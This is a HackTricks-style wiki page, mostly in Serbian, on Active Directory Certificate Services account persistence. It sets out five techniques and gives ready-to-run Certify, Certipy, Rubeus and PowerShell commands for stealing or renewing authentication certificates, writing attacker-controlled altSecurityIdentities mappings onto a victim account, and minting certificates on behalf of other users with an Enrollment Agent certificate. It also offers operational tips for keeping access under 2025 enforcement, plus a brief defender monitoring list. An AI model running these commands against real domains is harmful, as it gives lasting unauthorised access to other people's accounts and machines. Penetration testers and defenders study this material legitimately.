# AD CS Perzistencija naloga

{{#include ../../../banners/hacktricks-training.md}}

**Ovo je kratak rezime poglavlja o perzistenciji naloga iz odličnog istraživanja sa [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Razumevanje krađe akreditiva aktivnog korisnika pomoću sertifikata – PERSIST1

U scenariju u kojem korisnik može zatražiti sertifikat koji omogućava autentifikaciju u domenu, napadač ima mogućnost da zatraži i ukrade taj sertifikat kako bi održao perzistenciju na mreži. Podrazumevano, `User` template u Active Directory dozvoljava takve zahteve, iako ponekad može biti onemogućen.

Koristeći [Certify](https://github.com/GhostPack/Certify) ili [Certipy](https://github.com/ly4k/Certipy), možete pretražiti omogućene šablone koji dozvoljavaju autentifikaciju klijenta i zatim zatražiti jedan:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Moć sertifikata leži u njegovoj sposobnosti da se autentifikuje kao korisnik kome pripada, bez obzira na promene lozinke, sve dok sertifikat ostane važeći.

Možete konvertovati PEM u PFX i koristiti ga za dobijanje TGT-a:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Napomena: Kombinovano sa drugim tehnikama (pogledaj THEFT sekcije), autentifikacija zasnovana na sertifikatima omogućava uporan pristup bez dodirivanja LSASS i čak iz konteksta bez povišenih privilegija.

## Dobijanje trajne perzistencije mašine pomoću sertifikata - PERSIST2

Ako napadač ima povišene privilegije na hostu, može zatražiti sertifikat za račun mašine kompromitovanog sistema koristeći podrazumevani `Machine` šablon. Autentifikacija kao mašina omogućava S4U2Self za lokalne servise i može obezbediti trajnu perzistenciju na hostu:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Produžavanje Persistence putem obnove sertifikata - PERSIST3

Zloupotreba perioda važenja i obnove šablona sertifikata omogućava napadaču da održi dugoročan pristup. Ako posedujete ranije izdat sertifikat i njegov privatni ključ, možete ga obnoviti pre isteka da biste dobili novi, dugovečan kredencijal bez ostavljanja dodatnih artefakata zahteva povezanih sa originalnim nalogom.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operativni savet: Pratite rok trajanja PFX fajlova koje poseduje napadač i obnavljajte ih ranije. Obnova takođe može uzrokovati da ažurirani sertifikati uključe moderni SID mapping extension, čime ostaju upotrebljivi pod strožijim pravilima mapiranja DC-a (vidi sledeći odeljak).

## Postavljanje eksplicitnih mapiranja sertifikata (altSecurityIdentities) – PERSIST4

Ako možete pisati u `altSecurityIdentities` atribut ciljanog naloga, možete eksplicitno mapirati sertifikat pod kontrolom napadača na taj nalog. Ovo opstaje kroz promene lozinke i, kada se koriste snažni formati mapiranja, ostaje funkcionalno pod modernom primenom pravila na DC-ovima.

Opšti tok:

1. Nabavite ili izdate client-auth sertifikat koji kontrolišete (npr. enroll `User` template kao sebe).
2. Izvadite jak identifikator iz sertifikata (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Dodajte eksplicitno mapiranje na nalogu žrtve `altSecurityIdentities` koristeći taj identifikator.
4. Autentifikujte se svojim sertifikatom; DC ga mapira na žrtvu putem eksplicitnog mapiranja.

Primer (PowerShell) koji koristi jak Issuer+Serial mapiranje:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Zatim se autentifikujte pomoću svog PFX-a. Certipy će direktno dobiti TGT:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Izgradnja snažnih `altSecurityIdentities` preslikavanja

U praksi, **Issuer+Serial** i **SKI** preslikavanja su najlakši jaki formati za izgradnju iz sertifikata koji poseduje napadač. Ovo postaje važno posle **11. februara 2025.**, kada DCs podrazumevano pređu na **Full Enforcement** i slaba preslikavanja prestanu da budu pouzdana.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Napomene
- Koristite samo jake tipove mapiranja: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`. Slabi formati (Subject/Issuer, Subject-only, RFC822 email) su zastareli i mogu biti blokirani politikom DC-a.
- Mapiranje radi na oba **user** i **computer** objekta, pa je pristup za pisanje na `altSecurityIdentities` računarskog naloga dovoljan da se perzistira kao taj računar.
- Lanac sertifikata mora biti izgrađen do root koji DC smatra pouzdanim. Enterprise CAs u NTAuth su obično poverljive; neka okruženja takođe veruju javnim CA-ima.
- Schannel authentication ostaje korisna za perzistenciju čak i kada PKINIT zakaže zato što DC nema Smart Card Logon EKU ili vraća `KDC_ERR_PADATA_TYPE_NOSUPP`.

For more on weak explicit mappings and attack paths, see:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

If you obtain a valid Certificate Request Agent/Enrollment Agent certificate, you can mint new logon-capable certificates on behalf of users at will and keep the agent PFX offline as a persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Revocation of the agent certificate or template permissions is required to evict this persistence.
Povlačenje agent sertifikata ili dozvola na šablonu je potrebno da bi se uklonila ova perzistencija.

Operativne napomene
- Moderne verzije `Certipy` podržavaju i `-on-behalf-of` i `-renew`, tako da napadač koji poseduje Enrollment Agent PFX može izdati i kasnije obnoviti leaf sertifikate bez ponovnog diranja originalnog ciljnog naloga.
- Ako preuzimanje TGT-a zasnovano na PKINIT-u nije moguće, dobijeni on-behalf-of sertifikat i dalje se može koristiti za Schannel autentifikaciju sa `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Uticaj na perzistenciju

Microsoft KB5014754 je uveo Strong Certificate Mapping Enforcement na domain controller-ima. Od 11. februara 2025. DC-ovi podrazumevano rade u Full Enforcement režimu, odbijajući slaba/neodređena mapiranja. Praktične posledice:

- Sertifikati izdatih pre 2022. koji nemaju SID mapping extension mogu neuspešno implicitno mapiranje kada su DC-ovi u Full Enforcement režimu. Napadači mogu zadržati pristup ili obnavljanjem sertifikata kroz AD CS (da bi dobili SID mapping extension) ili postavljanjem jakog eksplicitnog mapiranja u `altSecurityIdentities` (PERSIST4).
- Eksplicitna mapiranja koja koriste jake formate (Issuer+Serial, SKI, SHA1-PublicKey) nastavljaju da rade. Slabi formati (Issuer/Subject, Subject-only, RFC822) mogu biti blokirani i treba ih izbegavati za perzistenciju.

Administratorima se preporučuje da nadgledaju i postave upozorenja na:
- Promene u `altSecurityIdentities` i izdavanju/obnavljanju Enrollment Agent i User sertifikata.
- CA issuance logs za on-behalf-of zahteve i neuobičajene obrasce obnove.

## References

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
